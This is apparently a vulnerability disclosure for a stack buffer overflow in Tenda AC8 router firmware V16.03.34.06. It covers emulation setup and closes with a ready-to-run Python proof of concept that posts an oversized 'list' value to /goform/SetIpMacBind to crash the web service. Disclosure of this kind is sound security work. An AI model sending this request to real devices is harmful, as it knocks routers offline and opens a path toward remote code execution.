sub\_49E098
-----------

Tenda AC8 version **V16.03.34.06** was discovered to contain a stack overflow via the list parameter in the function sub\_49E098.

### Overview

*   设备官网：[https://www.tenda.com.cn](https://www.tenda.com.cn/product/AX1806.html)
*   固件下载网站：[https://www.tenda.com.cn/material/show/103518](https://www.tenda.com.cn/material/show/103518)

### Affected version

**V16.03.34.06**

### Environmental simulation

need build Network bridge:

```text-plain
apt install uml-utilities bridge-utils
brctl addbr br0
ifconfig br0 192.168.142.100/24
brctl addif br0 ens33//搭建网桥
```

qemu start command：

```text-plain
sudo qemu-mipsel-static -L . ./bin/httpd
```

### Vulnerability details

![](api/attachments/wUZXhdW3Lr7h/image/image.png)

In lines 30 and 38 of the function, data is read from a user-supplied parameter passed by the caller function. However, the variable is passed without any length validation, which could result in a stack-based buffer overflow at either line 30 or 38. Consequently, an attacker could exploit this vulnerability by crafting a malicious request, potentially leading to a denial of service (DoS) condition or even remote code execution (RCE). This poses a significant security risk, as it allows an attacker to crash the system or execute arbitrary code remotely.

### PoC

Run this poc and you will see the service crash. The service will keep loading until it crashes.

```text-plain
import requests

headers = {
    'Host': '192.168.142.100',
    'Accept': '*/*',
    'X-Requested-With': 'XMLHttpRequest',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
    'Connection': 'close',
}
ip = "192.168.142.100"
ipaddr = "1" * 0x1000
data = 'bindnum=1&list=deviceName1\r10:11:11:11:11:11\r' + ipaddr

response = requests.post(
    f'http://{ip}/goform/SetIpMacBind', 
    headers=headers, 
    data=data, 
    verify=False)
```